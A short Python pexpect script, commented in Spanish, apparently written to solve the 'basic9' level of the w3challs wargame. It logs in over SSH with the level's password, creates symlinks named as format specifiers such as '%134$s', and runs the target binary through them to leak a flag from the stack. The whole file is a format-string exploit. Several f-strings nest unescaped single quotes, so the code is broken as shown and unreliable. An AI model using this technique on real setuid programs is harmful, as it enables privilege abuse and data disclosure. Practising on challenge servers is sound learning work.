#!/usr/bin/env python3

import pexpect

child = pexpect.spawn("ssh -o StrictHostKeyChecking=no -p 10101 basic9@pwn.w3challs.com", timeout=30)
child.expect([b'password:', b'Password:'])
child.sendline(b"basic9")
child.expect([b'\\$'])

print("[✓] Conectado!")

# Basado en los intentos anteriores, parece que hay algo alrededor de la posición 134
# Voy a probar un rango específico

child.sendline(b"cd /tmp")
child.expect([b'\\$'])

print("\n[*] Probando rango específico 130-140...")

for i in range(130, 141):
    # Crear symlink - el $ necesita escape para el shell
    cmd = f'ln -sf /home/basic9/basic9 \'%{i}$s\' 2>/dev/null'.encode()
    child.sendline(cmd)
    child.expect([b'\\$'])
    
    # Ejecutar
    cmd = f'./'%{i}$s' x 2>&1'.encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=2)
    
    output = child.before
    if b'W3C' in output:
        print(f"\n🔥 ENCONTRADO en posición {i} 🔥")
        print(output.decode('utf-8', errors='ignore'))
        
        # Intentar obtener más limpio
        cmd = f'./'%{i}$s' x 2>&1 | strings | grep W3C'.encode()
        child.sendline(cmd)
        child.expect([b'\\$'], timeout=2)
        print(child.before.decode('utf-8', errors='ignore'))
        break

# Si no está en ese rango, ampliar
print("\n[*] Ampliando búsqueda...")

for i in [100, 110, 120, 150, 160, 170, 180, 190, 200]:
    cmd = f'ln -sf /home/basic9/basic9 \'%{i}$s\' && ./'%{i}$s' x 2>&1 | grep -q W3C && echo "FOUND {i}"'.encode()
    child.sendline(cmd)
    child.expect([b'\\$'], timeout=1)
    
    if b'FOUND' in child.before:
        print(f"\n[!] Encontrado en {i}")
        
        cmd = f'./'%{i}$s' x 2>&1 | strings | grep W3C'.encode()
        child.sendline(cmd)
        child.expect([b'\\$'], timeout=2)
        print(child.before.decode('utf-8', errors='ignore'))
        break

child.close()